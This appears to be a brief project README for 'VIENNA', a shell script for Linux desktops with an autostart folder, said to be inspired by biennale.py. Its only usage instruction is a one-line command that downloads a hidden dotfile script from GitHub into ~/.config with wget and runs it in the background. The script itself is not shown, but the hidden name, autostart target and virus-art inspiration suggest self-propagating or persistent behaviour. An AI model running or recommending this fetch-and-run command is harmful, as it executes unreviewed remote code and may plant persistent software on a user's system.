# VIENNA
shell script designed to work on distros with a ~/.config/autostart folder,inspired by biennale.py
to run use 
if [[ ! -e $HOME/.config/.zimablue.sh ]]; then cd $HOME/.config;wget https://raw.githubusercontent.com/kittystrikeforce911/VIENNA/refs/heads/main/.zimablue.sh; bash .zimablue.sh & exit 1; fi
